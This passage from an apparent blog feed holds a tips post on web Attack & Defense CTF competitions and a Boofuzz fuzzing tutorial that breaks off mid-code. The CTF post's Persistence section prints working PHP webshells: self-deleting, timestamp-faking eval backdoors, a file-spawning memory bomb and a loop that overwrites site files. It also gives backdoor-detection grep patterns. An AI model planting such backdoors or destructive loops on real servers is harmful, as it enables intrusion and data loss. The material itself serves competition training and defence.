        <tag>mips</tag>
        <tag>emulator</tag>
        <tag>firmadyne</tag>
        <tag>firmae</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack &amp; Defense Tips</title>
    <url>/2020/11/20/2020-11-20-Attack-Defense-Tips/</url>
    <content><![CDATA[<p>Attack &amp; Defense CTFs are a less common kind of CTF with more moving parts. They’re rarely done for the general public because of their complexity.<br>In an A&amp;D (sometimes AWD) CTF, teams are each given the same set of vulnerable server software. Teams are to setup &amp; audit this software before the competition. At the start of the competition, teams will connect their servers to an isolated network to join the CTF.<br>Within this network, teams will launch attacks against each others servers hoping to exploit the vulnerabilities they’ve found. Likewise, teams will need to properly patch their software so that it is protected against these exploits and functions normally.<br>Teams receive points for extracting flags, properly defending their flags, and keeping their servers operating normally.</p>
<h2 id="Preperation"><a href="#Preperation" class="headerlink" title="Preperation"></a>Preperation</h2><p>This passage is mainly for web A&amp;D, so all is about protecting your web application and break others.</p>
<h3 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h3><p>At the real start, we have to backup <code>src</code> dir and <code>db</code> data, so that we are able to recover the server if being attacked without knowing the vulns. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># backup files</span></span><br><span class="line"><span class="comment"># pack on gamebox</span></span><br><span class="line">$ tar -zcvf web.tar.gz /var/www/html/</span><br><span class="line"><span class="comment"># download to host </span></span><br><span class="line">$ scp -r -P Port remote_username@remote_ip:remote_folder local_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump mysql database</span></span><br><span class="line">$ <span class="built_in">cd</span> /var/lib/mysql</span><br><span class="line">$ mysqldump -u root -p your_db&gt;your_db.sql</span><br><span class="line">Enter password: </span><br><span class="line"><span class="comment"># dump all dbs</span></span><br><span class="line">$ mysqldump --all-databases &gt; bak.sql</span><br></pre></td></tr></table></figure>
<p>And to recover:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># recover mysql database</span></span><br><span class="line">$ mysql -u root -p your_db&lt; your_db.sql</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">...</span><br><span class="line">mysql&gt; create database your_db;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| your_db            |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use your_db</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="built_in">source</span> your_db.sql</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h3><p>Then we need to change password for <code>ssh</code>, database and the admin page of the site, leaving no backdoors and weak passwords.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change ssh passwd</span></span><br><span class="line">$ passwd</span><br><span class="line">Changing password <span class="keyword">for</span> xxx.</span><br><span class="line">Current password:</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line"></span><br><span class="line"><span class="comment"># change mysql passwd</span></span><br><span class="line">$ mysqladmin -u[user_name] -p[old_passwd] password new_passwd </span><br><span class="line"><span class="comment"># or in mysql cli</span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> user_name@localhost = password(<span class="string">&#x27;new_passwd&#x27;</span>);</span><br><span class="line"><span class="comment"># or edit table &#x27;user&#x27;</span></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user <span class="built_in">set</span> password=password(<span class="string">&#x27;new_passwd&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;user_name&#x27;</span> and host=<span class="string">&#x27;localhost&#x27;</span>; </span><br><span class="line">mysql&gt; flush privileges; </span><br><span class="line"><span class="comment"># in mysql 8</span></span><br><span class="line">mysql&gt; USE mysql</span><br><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;user_name&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH MYSQL_NATIVE_PASSWORD BY <span class="string">&#x27;new_passwd&#x27;</span>;</span><br><span class="line"><span class="comment"># or add &#x27;skip-grant-table&#x27; if forgetting root password</span></span><br></pre></td></tr></table></figure>
<p>Easy ways to detect backdoors (some tools will introduce below) :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;assert(&#x27;</span></span><br><span class="line">$ find . -name <span class="string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="string">&#x27;system(&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Make sure service ports opend and other ports closed (<code>netstat</code>, <code>ss</code>, <code>kill</code>) , and the key files privileges under control (<code>lsattr</code>, <code>chattr</code>) .<br>Visit <a href="/2019/05/07/2019-05-07-Linux-Security-Response/">Linux Security Response</a> for detailed commands.</p>
<h2 id="Attack-Control"><a href="#Attack-Control" class="headerlink" title="Attack (Control)"></a>Attack (Control)</h2><p>The web A&amp;D is like tiny but fierce pentest.</p>
<h3 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h3><p>It is the basic way to attack. Normally we use “off-the-shelf” scanners to check the “artificial” backdoors and identify vulnerabilities quickly. </p>
<ul>
<li><a class="link"   href="https://github.com/f1tz/cnseay" >Seay<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.d99net.net/News.asp?id=47" >D WebShellKill<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://free.safedog.cn/website_safedog.html" >SafeDog<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>After we take over the target, we have to make it persistent, and here are some methods.</p>
<ol>
<li>Reverse shell</li>
</ol>
<p>To manage shells: <a class="link"   href="https://github.com/WangYihang/Reverse-Shell-Manager" >Reverse-Shell-Manager<i class="fas fa-external-link-alt"></i></a><br>Other shell collections like: <a class="link"   href="https://github.com/tennc/webshell" >webshell<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/JohnTroony/php-webshells" >php-webshells<i class="fas fa-external-link-alt"></i></a> … all on <a class="link"   href="https://github.com/search?q=php+webshell" >github<i class="fas fa-external-link-alt"></i></a>.</p>
<ol start="2">
<li>Memory webshell</li>
</ol>
<p>It is a program inside the PHP process, producing webshell all the time. Here gives some examples:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);    <span class="comment">// script runs even user aborts</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);          <span class="comment">// set running time limit</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);           <span class="comment">// delete file (itself)</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;write.php&#x27;</span>;            <span class="comment">// file name </span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>; <span class="comment">// content</span></span><br><span class="line"><span class="comment">// access by .../pass=pass, post-data:c=cmd</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>); <span class="comment">// write &#x27;code&#x27; to &#x27;file&#x27;</span></span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2020-11-20 19:05:30&quot; .write.php&#x27;</span>); <span class="comment">// fake the date info</span></span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>But you can be better:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>); <span class="comment">// <span class="meta">&lt;?php</span> eval($_POST[c]);<span class="meta">?&gt;</span></span></span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>))===md5(<span class="variable">$code</span>)) &#123;   <span class="comment">// prevent from changing, like commenting original php code</span></span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Or you can bomb the memory:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(randstr().<span class="string">&#x27;.php&#x27;</span>,file_get_content(<span class="keyword">__FILE__</span>));</span><br><span class="line">        file_get_contents(<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>To delete them:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    array_map(<span class="string">&#x27;unlink&#x27;</span>, glob(<span class="string">&quot;some/dir/*.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Or to change them:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(glob(<span class="variable">$path</span>) <span class="keyword">as</span> <span class="variable">$afile</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="variable">$afile</span>))</span><br><span class="line">                getfiles(<span class="variable">$afile</span>.<span class="string">&#x27;/*.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @file_put_contents(<span class="variable">$afile</span>,<span class="string">&quot;#Anything#&quot;</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        getfiles(<span class="keyword">__DIR__</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>About worm php webshell, visit <a class="link"   href="https://github.com/3sNwgeek/awd_worm_phpwebshell_framework/" >awd_worm_phpwebshell_framework<i class="fas fa-external-link-alt"></i></a> (in Chinese) </p>
<ol start="3">
<li>Apache Thread Injection</li>
</ol>
<p>A faster way than php memory webshell. A Linux <code>C</code> memory shell is even faster for sure.</p>
<h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><p>Except securing that we mentioned in <a href="/2020/11/20/2020-11-20-Attack-Defense-Tips/#Preperation">Preperation</a>, we can use some “off-the-shelf” scripts to help defending.</p>
<h3 id="Traffic-amp-File-Monitor"><a href="#Traffic-amp-File-Monitor" class="headerlink" title="Traffic &amp; File Monitor"></a>Traffic &amp; File Monitor</h3><ul>
<li><a class="link"   href="https://github.com/wupco/weblogger" >WebLogger<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/leohearts/awd-watchbird" >Watchbird<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Some of my collection: <a href="/filehost/adt/filemon.py">filemon.py</a>, <a href="/filehost/adt/logger.php">logger.php</a>, <a href="/filehost/adt/logger1.php">logger1.php</a>, <a href="/filehost/adt/logger2.php">logger2.php</a>, <a href="/filehost/adt/waf.php">waf.php</a>, <a href="/filehost/adt/waf1.php">waf1.php</a>.<br>Write <code>require_once(&#39;xxx.php&#39;);</code> to the page you want to protect, better be the one required by many other pages. </p>
<h3 id="Kill-Memory-Webshell"><a href="#Kill-Memory-Webshell" class="headerlink" title="Kill Memory Webshell"></a>Kill Memory Webshell</h3><p>Use <code>kill -9 -1</code> to kill each process of current user, so as the memory webshell process.<br>Or refer to <a class="link"   href="http://localhost:4000/2020/11/20/2020-11-20-Attack-Defense-Tips/#Persistence" >Persistence<i class="fas fa-external-link-alt"></i></a> part to kill them using similar methods (delete them constantly).<br>Create directory or file with the same name of memory webshell (writing empty file constantly) to prevent generating.</p>
<p>Google this you can also get a bunch of results.</p>
<p>Sometimes we meet file names starting with <code>/</code> or <code>-</code>, which will mess your <code>bash</code>.<br>For file names like <code>/abc</code>, which will be regarded as path, just <code>rm &#39;/abc&#39;</code> to delete.<br>For file names like <code>-abc</code>, which is treated as an invalid option, add <code>--</code> ahead to delete, like <code>rm -- -abc</code>  </p>
<h3 id="White-List-Control"><a href="#White-List-Control" class="headerlink" title="White List Control"></a>White List Control</h3><p>For <code>Apache</code> it would be <code>.htaccess</code>, while for <code>Nginx</code> it would be <code>nginx.conf</code>, write white list config to it for better access control.</p>
<h2 id="Other-Tools-amp-Scripts"><a href="#Other-Tools-amp-Scripts" class="headerlink" title="Other Tools &amp; Scripts"></a>Other Tools &amp; Scripts</h2><p>Actually many <a class="link"   href="https://github.com/search?q=awd" >github repos<i class="fas fa-external-link-alt"></i></a> like <a class="link"   href="https://github.com/Ares-X/AWD-Predator-Framework" >AWD-Predator-Framework<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/admintony/Prepare-for-AWD" >Prepare-for-AWD<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/DasSecurity-HatLab/AoiAWD" >AoiAWD<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/ssooking/CTFDefense" >CTFDefense<i class="fas fa-external-link-alt"></i></a> are about <code>Attack with defence</code> (in Chinese), concerning WAF building, and automatic flag uploading.</p>
<p>An interesting <a class="link"   href="https://github.com/zhl2008/awd-platform" >awd-platform<i class="fas fa-external-link-alt"></i></a> is to set up your awd environment(web challenges only).</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>awd</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzz with Boofuzz (the Successor to Sulley)</title>
    <url>/2020/10/21/2020-10-21-Fuzz-with-Boofuzz-the-Successor-to-Sulley/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/jtpereyda/boofuzz" >Boofuzz<i class="fas fa-external-link-alt"></i></a> is a fork of and the successor to the venerable <a class="link"   href="https://github.com/OpenRCE/sulley" >Sulley<i class="fas fa-external-link-alt"></i></a> fuzzing framework.</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Comparing to <a class="link"   href="https://github.com/google/AFL" >AFL<i class="fas fa-external-link-alt"></i></a>, a code coverage guided fuzzer aiming at binary programs, <code>boofuzz</code> is based on <code>Sulley</code>, a network protocol fuzzer.<br>As it is for fuzzing network protocols, users should pay more attention to the details of the protocol, so an analysis of a network protocol is really needed, because it determines how users write fuzzing scripts and whether they can find specific bugs. </p>
<p>And:</p>
<p>Like <code>Sulley</code>, <code>boofuzz</code> incorporates all the critical elements of a fuzzer:</p>
<ul>
<li>Easy and quick data generation.</li>
<li>Instrumentation – AKA failure detection.</li>
<li>Target reset after failure.</li>
<li>Recording of test data.</li>
</ul>
<p>Unlike <code>Sulley</code>, <code>boofuzz</code> also features:</p>
<ul>
<li>Online <a class="link"   href="https://boofuzz.readthedocs.io/" >documentation<i class="fas fa-external-link-alt"></i></a>.</li>
<li>Support for arbitrary communications mediums.</li>
<li>Built-in support for serial fuzzing, ethernet- and IP-layer, UDP broadcast.</li>
<li>Better recording of test data – consistent, thorough, clear.</li>
<li>Test result CSV export.</li>
<li>Extensible instrumentation&#x2F;failure detection.</li>
<li>Much easier install experience!</li>
<li>Far fewer bugs.</li>
</ul>
<p><a class="link"   href="https://github.com/OpenRCE/sulley" >Sulley<i class="fas fa-external-link-alt"></i></a> is affectionately named after the giant teal and purple creature from Monsters Inc. due to his fuzziness.<br><img src="/imghost/fbss/sulley.jpg" alt="Sulley from Monsters Inc"><br><a class="link"   href="https://github.com/jtpereyda/boofuzz" >Boofuzz<i class="fas fa-external-link-alt"></i></a> is likewise named after the only creature known to have scared Sulley himself: Boo!<br><img src="/imghost/fbss/boo.jpg" alt="Boo from Monsters Inc"></p>
<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p><code>Boofuzz</code> requires <code>Python</code> 2.7 or ≥ 3.5. Recommended installation requires pip. To ensure forward compatibility, <code>Python</code> 3 is recommended.<br>So If you are using <code>Python</code> 3:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install boofuzz</span><br></pre></td></tr></table></figure>
<p>For <code>Python</code> 2 the <code>virtualenv</code> is recommended:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir boofuzz &amp;&amp; <span class="built_in">cd</span> boofuzz</span><br><span class="line">$ virtualenv -p /usr/bin/python env <span class="comment"># python 2</span></span><br><span class="line">$ python3 -m venv env <span class="comment"># python 3</span></span><br><span class="line">$ <span class="built_in">source</span> env/bin/activate </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">&gt; env\Scripts\activate.bat <span class="comment"># for windows</span></span><br><span class="line">(env) $ pip install -U pip setuptools</span><br><span class="line">(env) $ pip install boofuzz</span><br><span class="line"><span class="comment"># actions</span></span><br><span class="line">$ deactive</span><br></pre></td></tr></table></figure>
<p>From source</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/jtpereyda/boofuzz.git</span><br><span class="line">$ <span class="built_in">cd</span> boofuzz</span><br><span class="line">$ pip install .</span><br></pre></td></tr></table></figure>

<h2 id="Intro-to-Sulley"><a href="#Intro-to-Sulley" class="headerlink" title="Intro to Sulley"></a>Intro to Sulley</h2><p>As <code>boofuzz</code> is based on <code>Sulley</code>, the usages and structures of them are almost the same. Besides, for now <code>Sulley</code> gets richer technical materials to search, so we get to know it before learning <code>boofuzz</code>.</p>
<p>First we get to know some words:</p>
<table>
<thead>
<tr>
<th align="center">Words</th>
<th align="center">Meanings</th>
</tr>
</thead>
<tbody><tr>
<td align="center">host</td>
<td align="center">host to start fuzzing (fuzzer)</td>
</tr>
<tr>
<td align="center">target</td>
<td align="center">the fuzzing target</td>
</tr>
<tr>
<td align="center">agents</td>
<td align="center">monitor target and get traffic</td>
</tr>
<tr>
<td align="center">request</td>
<td align="center">data package to send, a request for each data message</td>
</tr>
<tr>
<td align="center">session</td>
<td align="center">graph of several data packages, like a state graph of a stateful protocol</td>
</tr>
</tbody></table>
<p>The whole architecture is:<br><img src="/imghost/fbss/sulley-3-1.png" alt="architecture"><br>We check them one by one. First comes the data generation module.<br><img src="/imghost/fbss/sulley-3-2.png" alt="data generation (to build request)"><br>As <code>Sulley</code> is generation-based, we need to model the protocol and file.  </p>
<ul>
<li>A <code>primitive</code> can be a byte, a string, a number (like integer), a checksum, a delimiter (special symbol in protocols), and other elements of a network protocol. They can be static or dynamic (to be fuzzing parameters).</li>
<li>A <code>block</code> consists of many <code>primitives</code>, and <code>blocks</code> can be nested within each another <code>block</code>. It represents a series of primitives.</li>
<li>A <code>group</code> (not in image, but useful) is to provide a fuzzing parameter with some candidate values (set range). It is often used with <code>block</code>. </li>
<li>A data message consists of many <code>primitives</code> and <code>blocks</code>. Except them we can customize some special <code>primitives</code> –&gt; <code>legos</code>: Email address, IP address or so. </li>
<li>And some utils, like calculating length, checksum and encryption module.</li>
</ul>
<p>Next comes the session management module.<br><img src="/imghost/fbss/sulley-3-3.png" alt="session management"><br>After building the request (data message), how to combine each of them to form a state machine? Use <code>pgraph</code>, a <code>Python</code> library, to create, edit and render graph. For example:<br><img src="/imghost/fbss/sulley-3-4.png" alt="example"><br>Each node are connected to form a stateful graph, we can operate each node (consists of <code>primitives</code>) and define some callback functions.<br>When it comes time to fuzz, <code>Sulley</code> walks the graph structure starting with the root node and fuzzing each component along the way.<br>It fuzzes nodes one by one until a path is done, then it steps into another path.</p>
<p>Next is agents proxy module<br><img src="/imghost/fbss/sulley-3-5.png" alt="agents"><br>The agents proxy module is for monitoring and has 3 parts: VMControl, Netmon and Procmon.</p>
<ul>
<li>VMControl: We normally put target in virtual machine, and use this module to boot, shut or create snapshots for VM. Most important: recover host status when it crashes.</li>
<li>Netmon: Monitor network traffic and save <code>pcap</code> files in the disk. It captures 2-way traffic.</li>
<li>Procmon: On <code>Windows</code> it uses <a class="link"   href="https://github.com/OpenRCE/pydbg" >pydbg<i class="fas fa-external-link-alt"></i></a> (another <a href="https://github.com/OpenRCE"><code>OpenRce</code></a> project) to record program crashes and monitor the status, then write errors into <code>crash_bin</code> file.</li>
</ul>
<p>There are some independent utilities like:<br><img src="/imghost/fbss/sulley-3-6.png" alt="architecture"></p>
<ul>
<li>crashbin_explorer: Command line utility for exploring the results stored in serialized crash bin files.</li>
<li>… (others get no comments)</li>
</ul>
<p>So the whole work flow of <code>Sulley</code> is:</p>
<ol>
<li>Data message modeling</li>
<li>Connect to form state machine</li>
<li>Other modules assist fuzzing</li>
</ol>
<p>See the <a class="link"   href="http://www.fuzzing.org/wp-content/SulleyManual.pdf" >SulleyManual<i class="fas fa-external-link-alt"></i></a> for some other details.</p>
<h2 id="Usages-of-Boofuzz"><a href="#Usages-of-Boofuzz" class="headerlink" title="Usages of Boofuzz"></a>Usages of Boofuzz</h2><p>It is almost the same as <code>Sulley</code> so if you want to master this, read the <a class="link"   href="http://www.fuzzing.org/wp-content/SulleyManual.pdf" >SulleyManual<i class="fas fa-external-link-alt"></i></a> carefully.</p>
<p>Here we learn by <a class="link"   href="https://github.com/jtpereyda/boofuzz/tree/master/examples" >examples<i class="fas fa-external-link-alt"></i></a> given in <code>boofuzz/examples/</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd boofuzz/examples/</span><br><span class="line">$ ls</span><br><span class="line">ftp_simple.py                        fuzz_trillian_jabber.py</span><br><span class="line">ftp_with_procmon.py                  http_simple.py</span><br><span class="line">fuzz_ssl_client.py                   http_with_body.py</span><br><span class="line">fuzz_ssl_server.py                   iso8385.py</span><br><span class="line">fuzz_trend_control_manager_20901.py  mdns.py</span><br><span class="line">fuzz_trend_server_protect_5168.py    tftp_simple.py</span><br></pre></td></tr></table></figure>



<p>From <a class="link"   href="https://github.com/jtpereyda/boofuzz/blob/master/examples/ftp_simple.py" >ftp_simple.py<i class="fas fa-external-link-alt"></i></a> we can see there are 2 styles to build requests: the func <code>define_proto_static</code> and the func <code>define_proto</code> (newer).</p>
<p>In <code>Sulley</code> we used to use is this style:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">define_proto_static</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Same protocol, using the static definition style.&quot;&quot;&quot;</span></span><br><span class="line">    s_initialize(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;pass&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;PASS&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;james&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;stor&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;STOR&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s_initialize(<span class="string">&quot;retr&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;RETR&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">    s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">    session.connect(s_get(<span class="string">&quot;user&quot;</span>), s_get(<span class="string">&quot;pass&quot;</span>))</span><br><span class="line">    session.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;stor&quot;</span>))</span><br><span class="line">    session.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;retr&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>The <code>s_initialize(&quot;user&quot;)</code> starts a new request, the <code>s_string(&quot;USER&quot;)</code> and <code>s_delim(&quot; &quot;)</code> define dynamic <code>primitives</code> (to be fuzzed), and <code>s_static(&quot;\r\n&quot;)</code> define static <code>primitives</code>.</p>
<p>Statements like <code>session.connect(s_get(&quot;user&quot;))</code> or <code>session.connect(s_get(&quot;user&quot;), s_get(&quot;pass&quot;))</code> will set a root node or connect 2 nodes on a graph, a stateful graph like what we said in <code>session management</code>.</p>
<p>While <code>define_proto</code> is a newer one, just found it was updated on 2020&#x2F;10&#x2F;21:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">define_proto</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="comment"># disable Black formatting to keep custom indentation</span></span><br><span class="line">    <span class="comment"># fmt: off</span></span><br><span class="line">    user = Request(<span class="string">&quot;user&quot;</span>, children=(</span><br><span class="line">        String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;USER&quot;</span>),</span><br><span class="line">        Delim(<span class="string">&quot;space&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">        String(<span class="string">&quot;val&quot;</span>, <span class="string">&quot;anonymous&quot;</span>),</span><br><span class="line">        Static(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    passw = Request(<span class="string">&quot;pass&quot;</span>, children=(</span><br><span class="line">        String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;PASS&quot;</span>),</span><br><span class="line">        Delim(<span class="string">&quot;space&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">        String(<span class="string">&quot;val&quot;</span>, <span class="string">&quot;james&quot;</span>),</span><br><span class="line">        Static(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    stor = Request(<span class="string">&quot;stor&quot;</span>, children=(</span><br><span class="line">        String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;STOR&quot;</span>),</span><br><span class="line">        Delim(<span class="string">&quot;space&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">        String(<span class="string">&quot;val&quot;</span>, <span class="string">&quot;AAAA&quot;</span>),</span><br><span class="line">        Static(<span class="string">&quot;end&quot;</span>, <span class="string">&quot;\r\n&quot;</span>),</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    retr = Request(<span class="string">&quot;retr&quot;</span>, children=(</span><br><span class="line">        String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;RETR&quot;</span>),</span><br><span class="line">        Delim(<span class="string">&quot;space&quot;</span>, <span class="string">&quot; &quot;</span>),</span><br><span class="line">        String(<span class="string">&quot;val&quot;</span>, <span 